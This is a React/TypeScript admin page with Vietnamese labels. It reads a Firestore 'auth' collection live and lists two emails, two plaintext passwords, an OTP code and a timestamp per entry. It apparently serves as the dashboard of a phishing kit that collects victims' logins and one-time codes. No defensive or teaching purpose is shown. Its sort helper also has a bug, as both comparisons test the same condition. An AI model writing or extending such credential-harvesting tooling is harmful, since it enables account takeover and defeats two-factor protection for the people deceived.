import { useEffect, useState } from "react";
import { collection, onSnapshot } from "firebase/firestore";
import "./styles.css";
import { db } from "../../../firebase";
export default function Admin() {
  const [auths, setAuths] = useState<any[]>([]);

  function sort(array: any[], key: string) {
    return array.sort((a, b) => {
      if (a[key] > b[key]) {
        return -1;
      }
      if (a[key] > b[key]) {
        return 1;
      }
      return 0;
    });
  }

  function formatTime(timestam: number) {
    const d = new Date(timestam);
    return (
      [d.getDate(), d.getMonth() + 1, d.getFullYear()].join("/") +
      " " +
      [d.getHours(), d.getMinutes(), d.getSeconds()].join(":")
    );
  }

  useEffect(() => {
    const unsub = onSnapshot(collection(db, "auth"), (data) => {
      let arr: any[] = [];
      data.forEach((item) => {
        arr = [...arr, item.data()];
      });

      setAuths(sort(arr, "create_at"));
    });
    return () => unsub();
  }, []);

  return (
    <div className="container">
      <div className="result">
        <table>
          <thead>
            <tr>
              <th>Email 1</th>
              <th>Email 2</th>
              <th>Mật khẩu 1</th>
              <th>Mật khẩu 2</th>
              <th>OTP</th>
              <th>Thời gian</th>
            </tr>
          </thead>
          <tbody>
            {auths.map((auth: any, index: number) => {
              return (
                <tr key={index}>
                  <td>{auth.email_1}</td>
                  <td>{auth.email_2}</td>
                  <td>{auth.password_1}</td>
                  <td>{auth.password_2}</td>
                  <td>{auth.otp}</td>
                  <td>{formatTime(auth.create_at)}</td>
                </tr>
              );
            })}
          </tbody>
        </table>
      </div>
    </div>
  );
}
